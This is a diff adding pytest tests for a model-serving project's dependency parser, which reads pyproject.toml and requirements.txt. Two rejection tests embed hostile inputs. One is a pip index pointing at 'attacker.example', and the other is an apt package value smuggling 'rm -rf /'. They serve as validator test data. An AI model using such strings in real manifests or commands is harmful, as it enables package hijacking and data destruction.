@@ -1,11 +1,15 @@
 import io
 import logging
 import os
+from pathlib import Path
 from typing import cast
 
 import pytest
 
+from triton_serve.storage.validation import parse_dependencies
+
 LOG = logging.getLogger(pytest.__name__)
+DATA = Path(__file__).parent / "data"
 
 
 def test_get_models_empty(test_client):
@@ -300,3 +304,101 @@ def test_delete_model_not_in_use(name, test_client, test_settings):
     assert data["deleted_at"] is not None
     expected_path = test_settings.repository_path / name
     assert not expected_path.exists()
+
+
+def test_pyproject_supplies_pip_and_system_dependencies():
+    deps = parse_dependencies(DATA / "bundle_pyproject")
+    assert deps.pip == ["numpy==1.26.4", "pillow==10.0.0"]
+    assert deps.system == ["libgl1", "libglib2.0-0"]
+
+
+def test_unknown_tool_serve_keys_are_ignored():
+    # `runtime` belongs to issue #130; a bundle carrying it must still parse here
+    assert parse_dependencies(DATA / "bundle_pyproject").system == ["libgl1", "libglib2.0-0"]
+
+
+def test_requirements_txt_is_still_read_when_no_pyproject():
+    deps = parse_dependencies(DATA / "bundle_requirements")
+    assert deps.pip == ["numpy==1.26.4"]
+    assert deps.system == []
+
+
+def test_pyproject_wins_over_requirements_txt(tmp_path: Path):
+    (tmp_path / "requirements.txt").write_text("legacy==1.0.0\n")
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname = "b"\nversion = "0.1.0"\ndependencies = ["modern==2.0.0"]\n'
+    )
+    assert parse_dependencies(tmp_path).pip == ["modern==2.0.0"]
+
+
+def test_missing_manifest_is_no_dependencies(tmp_path: Path):
+    deps = parse_dependencies(tmp_path)
+    assert deps.pip == []
+    assert deps.system == []
+
+
+def test_incompatible_requires_python_is_rejected():
+    with pytest.raises(AssertionError, match="requires-python"):
+        parse_dependencies(DATA / "bundle_bad_python")
+
+
+def test_malformed_pyproject_is_rejected(tmp_path: Path):
+    (tmp_path / "pyproject.toml").write_text("[project\nname =")
+    with pytest.raises(AssertionError, match="pyproject.toml"):
+        parse_dependencies(tmp_path)
+
+
+def test_unparseable_requirement_is_rejected_at_upload(tmp_path: Path):
+    """Rejecting it here is what keeps a bad bundle from being committed and failing at service create."""
+    (tmp_path / "requirements.txt").write_text("--extra-index-url http://attacker.example\n")
+    with pytest.raises(AssertionError, match="requirement"):
+        parse_dependencies(tmp_path)
+
+
+def test_invalid_system_package_is_rejected_at_upload(tmp_path: Path):
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname = "b"\nversion = "0.1.0"\n[tool.serve]\nsystem-packages = ["libgl1; rm -rf /"]\n'
+    )
+    with pytest.raises(AssertionError, match="apt package"):
+        parse_dependencies(tmp_path)
+
+
+def test_changed_dependencies_repoint_affected_services(test_client, test_db, test_settings, monkeypatch):
+    from triton_serve.api.models import domain
+    from triton_serve.database.model import Model, Service
+
+    # the build is recorded rather than queued: a real one would push an image no test cleans up
+    enqueued: list[str] = []
+    monkeypatch.setattr(domain, "enqueue_build", enqueued.append)
+
+    response = test_client.post(
+        "/services",
+        json={
+            "name": "trt-srv_test_fanout",
+            "models": ["onnx"],
+            "resources": {"gpus": 0, "shm_size": 256, "mem_size": 1024},
+            "timeout": 3600,
+        },
+    )
+    assert response.status_code == 201, response.text
+    service_id = response.json()["service_id"]
+    model = test_db.query(Model).filter(Model.model_name == "onnx").one()
+    original = list(model.dependencies or [])
+    try:
+        test_db.expire_all()
+        before = test_db.get(Service, ident=service_id).image_hash
+
+        model.dependencies = ["numpy==1.26.0"]
+        test_db.commit()
+        domain.refresh_service_images(db=test_db, models=[model], settings=test_settings)
+
+        test_db.expire_all()
+        service = test_db.get(Service, ident=service_id)
+        assert service.image_hash != before
+        assert service.image.managed
+        assert "numpy==1.26.0" in service.image.pip_packages
+        assert enqueued == [service.image_hash]
+    finally:
+        model.dependencies = original
+        test_db.commit()
+        test_client.delete(f"/services/{service_id}")
